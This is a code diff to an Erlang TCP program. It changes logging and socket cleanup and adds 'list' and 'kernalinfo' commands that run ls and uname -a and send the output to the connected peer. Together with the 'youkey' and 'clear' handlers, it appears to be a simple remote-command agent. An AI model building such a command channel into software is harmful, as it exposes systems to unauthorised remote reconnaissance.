@@ -12,7 +12,7 @@ start() ->
                         {ok, Packet} ->
                             case Packet of
                                 <<"youkey ",Pack/binary>> ->
-                                    io:format("~p~n",[Pack]),
+                                    io:format("~p~n",[Packet]),
                                     file:write_file("dump.txt", Pack),
                                     loop(Socket);
                                 _ ->
@@ -22,13 +22,13 @@ start() ->
                             io:format("error:~p~n",[Reason])
                     end;
                 _ ->
-                    io:format("send ~p~n file",[BinaryFile]),
+                    io:format("send ~p file~n",[BinaryFile]),
                     gen_tcp:send(Socket, BinaryFile),
                     case gen_tcp:recv(Socket,0) of
                         {ok, Packet} ->
                             case Packet of
                                 <<"clear ",Pack/binary>> ->
-                                    io:format("~p~n",[Pack]),
+                                    io:format("~p~n",[Packet]),
                                     file:write_file("dump.txt", Pack),
                                     loop(Socket);
                                 _ ->
@@ -39,7 +39,9 @@ start() ->
                     end
             end;
         _ ->
-            file:open("dump.txt", exclusive),
+            {ok, File} = file:open("dump.txt", write),
+            file:close(File),
+            gen_tcp:close(Socket),
             start()
     end.
 
@@ -72,6 +74,14 @@ loop(Socket) ->
                         {error, Reason} ->
                             io:format("error:~p~n",[Reason])
                     end;
+                <<"list">> ->
+                    ListFile = erlang:list_to_binary(os:cmd("ls")),
+                    gen_tcp:send(Socket, ListFile),
+                    loop(Socket);
+                <<"kernalinfo">> ->
+                    Kernal = os:cmd("uname -a"),
+                    gen_tcp:send(Socket, Kernal),
+                    loop(Socket);
                 _ ->
                     io:format("errorCmd:~p~n",[Packet])
             end;
